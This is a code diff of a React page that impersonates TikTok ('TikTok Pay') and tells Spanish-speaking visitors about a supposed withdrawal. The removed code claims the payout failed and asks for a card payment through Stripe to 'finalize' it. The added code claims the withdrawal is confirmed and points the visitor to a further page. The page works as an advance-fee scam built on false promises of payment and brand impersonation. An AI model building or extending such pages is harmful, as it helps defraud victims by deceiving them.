@@ -1,29 +1,18 @@
-import { createFileRoute } from "@tanstack/react-router";
-import { useEffect, useRef, useState } from "react";
+import { createFileRoute, useNavigate } from "@tanstack/react-router";
 import tiktokLogo from "@/assets/tiktok-logo-clean.png.asset.json";
-import {
-  THREEB_API_KEY,
-  THREEB_BASE_URL,
-  formatPrice,
-  loadStripeJs,
-  type CheckoutConfig,
-} from "@/lib/checkout-config";
-
-const RETRY_PRODUCT_ID = "65009b71-7660-44ef-ba87-24f29c7599a4";
 
 export const Route = createFileRoute("/obrigado")({
   head: () => ({
     meta: [
-      { title: "El pago no se ha completado | Finaliza tu retiro" },
+      { title: "Solicitud Confirmada | TikTok Pay" },
       {
         name: "description",
-        content:
-          "Inestabilidad temporal o sesión expirada. No se realizó ningún cargo a tu tarjeta. Vuelve a intentarlo para finalizar tu retiro.",
+        content: "Tu retiro fue recibido con éxito. Procesamiento en curso.",
       },
-      { property: "og:title", content: "El pago no se ha completado" },
+      { property: "og:title", content: "Solicitud Confirmada" },
       {
         property: "og:description",
-        content: "Vuelve a intentarlo para finalizar tu retiro. Tu saldo sigue reservado.",
+        content: "Tu retiro fue recibido con éxito.",
       },
       { property: "og:type", content: "website" },
       { name: "twitter:card", content: "summary_large_image" },
@@ -33,283 +22,98 @@ export const Route = createFileRoute("/obrigado")({
 });
 
 function Obrigado() {
-  const [open, setOpen] = useState(false);
-  const [config, setConfig] = useState<CheckoutConfig | null>(null);
-  const [email, setEmail] = useState("");
-  const [loadError, setLoadError] = useState<string | null>(null);
-  const [payError, setPayError] = useState<string | null>(null);
-  const [paying, setPaying] = useState(false);
-  const [ready, setReady] = useState(false);
-
-  const stripeRef = useRef<any>(null);
-  const elementsRef = useRef<any>(null);
-  const emailRef = useRef("");
-  emailRef.current = email;
-
-  useEffect(() => {
-    if (!open) return;
-    let cancelled = false;
-
-    (async () => {
-      try {
-        const res = await fetch(
-          `${THREEB_BASE_URL}/get-checkout-config?apiKey=${encodeURIComponent(
-            THREEB_API_KEY,
-          )}&productId=${encodeURIComponent(RETRY_PRODUCT_ID)}`,
-        );
-        if (!res.ok) throw new Error(await res.text());
-        const data: CheckoutConfig = await res.json();
-        if (cancelled) return;
-        setConfig(data);
-
-        const Stripe = await loadStripeJs();
-        if (cancelled) return;
-        const stripe = Stripe(data.publishableKey);
-        stripeRef.current = stripe;
-
-        const elements = stripe.elements({
-          mode: "payment",
-          amount: data.product.priceCents,
-          currency: data.product.currency.toLowerCase(),
-          locale: "es",
-          appearance: {
-            theme: "stripe",
-            variables: {
-              colorPrimary: "#f43f5e",
-              borderRadius: "12px",
-              fontFamily: "system-ui, sans-serif",
-            },
-          },
-        });
-        elementsRef.current = elements;
-
-        const expr = elements.create("expressCheckout");
-        expr.mount("#retry-express");
-        expr.on("confirm", () => void pay());
-
-        const payment = elements.create("payment", {
-          terms: { card: "never" },
-          fields: { billingDetails: { email: "never" } },
-        });
-        payment.mount("#retry-payment");
-        payment.on("ready", () => setReady(true));
-      } catch (e: any) {
-        if (!cancelled) setLoadError(e?.message || "No se pudo cargar el pago.");
-      }
-    })();
-
-    return () => {
-      cancelled = true;
-    };
-    // eslint-disable-next-line react-hooks/exhaustive-deps
-  }, [open]);
-
-  async function pay() {
-    const stripe = stripeRef.current;
-    const elements = elementsRef.current;
-    if (!stripe || !elements || !config) return;
-
-    setPayError(null);
-    setPaying(true);
-    try {
-      const buyerEmail = emailRef.current.trim();
-      if (!buyerEmail) {
-        setPayError("Introduce tu correo electrónico.");
-        setPaying(false);
-        return;
-      }
-
-      const { error: submitError } = await elements.submit();
-      if (submitError) {
-        setPayError(submitError.message || "Revisa los datos de la tarjeta.");
-        setPaying(false);
-        return;
-      }
-
-      const res = await fetch(`${THREEB_BASE_URL}/create-payment-intent`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          apiKey: THREEB_API_KEY,
-          productId: config.product.id,
-          quantity: 1,
-          buyerEmail,
-        }),
-      });
-      if (!res.ok) throw new Error(await res.text());
-      const { clientSecret, paymentIntentId } = await res.json();
-
-      const { error } = await stripe.confirmPayment({
-        elements,
-        clientSecret,
-        confirmParams: {
-          return_url: `${window.location.origin}/obrigado?payment_intent=${paymentIntentId}`,
-          payment_method_data: { billing_details: { email: buyerEmail } },
-        },
-      });
-      if (error) setPayError(error.message || "No se pudo procesar el pago.");
-    } catch (e: any) {
-      setPayError(e?.message || "No se pudo procesar el pago.");
-    } finally {
-      setPaying(false);
-    }
-  }
+  const navigate = useNavigate();
 
   return (
-    <main className="min-h-screen w-full bg-neutral-500 px-4 py-10 flex items-center justify-center">
-      <section className="w-full max-w-md rounded-2xl bg-white px-7 py-8 shadow-[0_20px_60px_rgba(0,0,0,0.25)]">
+    <main className="min-h-screen w-full bg-[#f8f9fa] flex flex-col items-center">
+      {/* Header Warning */}
+      <div className="w-full bg-[#ff3b5c] py-2 px-4 text-center">
+        <p className="text-white text-[11px] font-bold uppercase tracking-tight flex items-center justify-center gap-2">
+          <svg viewBox="0 0 24 24" className="h-4 w-4" fill="currentColor">
+            <path d="M12 2L1 21h22L12 2zm0 3.45L19.53 19H4.47L12 5.45zM11 16h2v2h-2v-2zm0-7h2v5h-2V9z" />
+          </svg>
+          IMPORTANTE: NO CIERRES ESTA PÁGINA HASTA LEER LA INFORMACIÓN COMPLETA.
+        </p>
+      </div>
+
+      <section className="w-full max-w-[500px] px-6 py-12 flex flex-col items-center text-center">
         {/* Logo */}
         <img
           src={tiktokLogo.url}
           alt="TikTok"
-          className="mx-auto mb-7 h-12 w-auto"
+          className="h-10 w-auto mb-10"
         />
 
-        {/* Icon */}
-        <div className="mx-auto mb-6 grid h-[72px] w-[72px] place-items-center rounded-full bg-rose-100">
-
+        {/* Success Icon */}
+        <div className="mb-6 flex h-20 w-20 items-center justify-center rounded-full bg-[#25d366] shadow-[0_8px_20px_rgba(37,211,102,0.3)]">
           <svg
             viewBox="0 0 24 24"
-            className="h-8 w-8 text-rose-500"
+            className="h-10 w-10 text-white"
             fill="none"
             stroke="currentColor"
-            strokeWidth="2.5"
+            strokeWidth="3.5"
             strokeLinecap="round"
-            aria-hidden="true"
+            strokeLinejoin="round"
           >
-            <path d="M6 6l12 12M18 6L6 18" />
+            <polyline points="20 6 9 17 4 12" />
           </svg>
         </div>
 
         {/* Badge */}
-        <div className="mb-5 flex justify-center">
-          <span className="inline-flex items-center gap-2 rounded-full bg-amber-100 px-4 py-1.5 text-[11px] font-extrabold uppercase tracking-wide text-amber-800">
-            <span className="h-1.5 w-1.5 rounded-full bg-amber-500" />
-            Casi listo · Solo 1 paso
+        <div className="mb-6">
+          <span className="inline-flex items-center gap-2 rounded-full border border-[#25d366]/20 bg-[#25d366]/5 px-4 py-1.5 text-[12px] font-bold text-[#25d366] uppercase tracking-wider">
+            <span className="h-2 w-2 rounded-full bg-[#25d366] animate-pulse" />
+            Solicitud Confirmada
           </span>
         </div>
 
-        <h1 className="mb-3 text-center text-[28px] font-black leading-tight text-neutral-900">
-          El pago no se ha completado
+        {/* Main Title */}
+        <h1 className="mb-8 text-[32px] font-black leading-[1.1] text-[#161823]">
+          ¡Tu retiro fue <span className="bg-gradient-to-r from-[#ff3b5c] via-[#25f4ee] to-[#161823] bg-clip-text text-transparent">recibido con éxito!</span>
         </h1>
-        <p className="mx-auto mb-6 max-w-[330px] text-center text-[15px] leading-relaxed text-neutral-500">
-          Inestabilidad temporal o sesión expirada. No se realizó ningún cargo a tu tarjeta.
+
+        {/* Info Card */}
+        <div className="w-full rounded-[24px] bg-white p-8 shadow-[0_20px_50px_rgba(0,0,0,0.06)] text-left mb-8 border border-neutral-100">
+          <p className="mb-6 text-[15px] leading-relaxed text-[#161823]">
+            Debido a la <span className="font-bold text-[#ff3b5c]">alta demanda de retiros</span>, tu solicitud será procesada en un plazo de <span className="font-bold underline underline-offset-2">hasta 7 días hábiles.</span>
+          </p>
+
+          <ul className="space-y-5">
+            {[
+              "Tu pago está en la cola de procesamiento del equipo financiero de TikTok.",
+              "Recibirás la transferencia directamente en el método elegido al solicitar el retiro.",
+              "No es necesario realizar ninguna acción adicional de tu parte.",
+            ].map((text, i) => (
+              <li key={i} className="flex items-start gap-3">
+                <svg
+                  viewBox="0 0 24 24"
+                  className="mt-0.5 h-5 w-5 shrink-0 text-[#25d366]"
+                  fill="none"
+                  stroke="currentColor"
+                  strokeWidth="3"
+                  strokeLinecap="round"
+                  strokeLinejoin="round"
+                >
+                  <polyline points="20 6 9 17 4 12" />
+                </svg>
+                <span className="text-[14px] leading-snug text-[#4a4a4a]">{text}</span>
+              </li>
+            ))}
+          </ul>
+        </div>
+
+        {/* Footer Text */}
+        <p className="mb-10 text-[12px] italic leading-relaxed text-[#8a8a8e] px-4">
+          Agradecemos tu paciencia. El equipo de TikTok Pay está trabajando para liberar tu pago lo antes posible.
         </p>
 
-        {/* Retry notice */}
-        <div className="mb-4 rounded-xl border border-rose-100 bg-rose-50/70 px-4 py-4 text-center text-sm font-bold text-rose-500">
-          Vuelve a intentarlo para finalizar tu retiro.
-        </div>
-
-        {/* Reserved balance */}
-        <div className="mb-6 rounded-xl border border-dashed border-rose-200 px-4 py-4">
-          <p className="mb-1.5 flex items-center gap-2 text-[11px] font-extrabold uppercase tracking-wide text-rose-500">
-            <svg
-              viewBox="0 0 24 24"
-              className="h-3.5 w-3.5"
-              fill="none"
-              stroke="currentColor"
-              strokeWidth="2.5"
-              aria-hidden="true"
-            >
-              <circle cx="12" cy="12" r="9" />
-              <path d="M12 7v5l3 2" strokeLinecap="round" />
-            </svg>
-            Tu saldo sigue reservado
-          </p>
-          <p className="text-sm leading-relaxed text-neutral-700">
-            Finaliza ahora para asegurar el desbloqueo y recibir en 15 minutos.
-          </p>
-        </div>
-
-        {!open ? (
-          <button
-            type="button"
-            onClick={() => setOpen(true)}
-            className="flex w-full items-center justify-center gap-2 rounded-xl bg-gradient-to-b from-rose-500 to-rose-600 py-4 text-[17px] font-black text-white shadow-lg transition-all hover:from-rose-600 hover:to-rose-700 active:scale-[0.99]"
-          >
-            Intentar de nuevo
-            <span aria-hidden="true">→</span>
-          </button>
-        ) : (
-          <div>
-            <button
-              type="button"
-              onClick={() => void pay()}
-              disabled={!ready || paying}
-              className="mb-5 flex w-full items-center justify-center gap-2 rounded-xl bg-gradient-to-b from-rose-500 to-rose-600 py-4 text-[17px] font-black text-white shadow-lg transition-all hover:from-rose-600 hover:to-rose-700 active:scale-[0.99] disabled:opacity-60"
-            >
-              {paying
-                ? "Procesando…"
-                : `Pagar ahora${
-                    config
-                      ? ` ${formatPrice(config.product.priceCents, config.product.currency)}`
-                      : ""
-                  }`}
-              <svg
-                viewBox="0 0 24 24"
-                className="h-4 w-4"
-                fill="none"
-                stroke="currentColor"
-                strokeWidth="2.5"
-                aria-hidden="true"
-              >
-                <rect x="4" y="10" width="16" height="10" rx="2" />
-                <path d="M8 10V7a4 4 0 118 0v3" />
-              </svg>
-            </button>
-
-            {loadError && (
-              <p className="mb-3 text-sm font-medium text-rose-600" role="alert">
-                {loadError}
-              </p>
-            )}
-
-            <label
-              className="mb-1 block text-sm font-semibold text-neutral-700"
-              htmlFor="retry-email"
-            >
-              Correo electrónico
-            </label>
-            <input
-              id="retry-email"
-              type="email"
-              inputMode="email"
-              autoComplete="email"
-              required
-              value={email}
-              onChange={(e) => setEmail(e.target.value)}
-              placeholder="tu@email.com"
-              className="mb-4 w-full rounded-xl border border-neutral-300 bg-white px-4 py-3 text-sm outline-none focus:border-rose-400 focus:ring-2 focus:ring-rose-200"
-            />
-
-            <div id="retry-express" className="mb-4" />
-            <div id="retry-payment" className="mb-3 min-h-[140px]" />
-
-            {payError && (
-              <p className="mb-2 text-sm font-medium text-rose-600" role="alert">
-                {payError}
-              </p>
-            )}
-          </div>
-        )}
-
-        <div className="mt-6 border-t border-dashed border-neutral-200 pt-4">
-          <p className="flex items-center justify-center gap-1.5 text-[11px] font-bold uppercase tracking-wide text-neutral-400">
-            <svg
-              viewBox="0 0 24 24"
-              className="h-3.5 w-3.5"
-              fill="none"
-              stroke="currentColor"
-              strokeWidth="2"
-              aria-hidden="true"
-            >
-              <rect x="4" y="10" width="16" height="10" rx="2" />
-              <path d="M8 10V7a4 4 0 118 0v3" />
-            </svg>
-            Entorno 100% seguro · Cifrado de nivel bancario
-          </p>
-        </div>
+        {/* CTA Button */}
+        <button
+          onClick={() => navigate({ to: "/obrigado1" })}
+          className="w-full rounded-2xl bg-[#ff3b5c] py-5 text-[18px] font-black text-white shadow-[0_10px_30px_rgba(255,59,92,0.3)] transition-all hover:brightness-110 active:scale-[0.98]"
+        >
+          CONTINUAR
+        </button>
       </section>
     </main>
   );
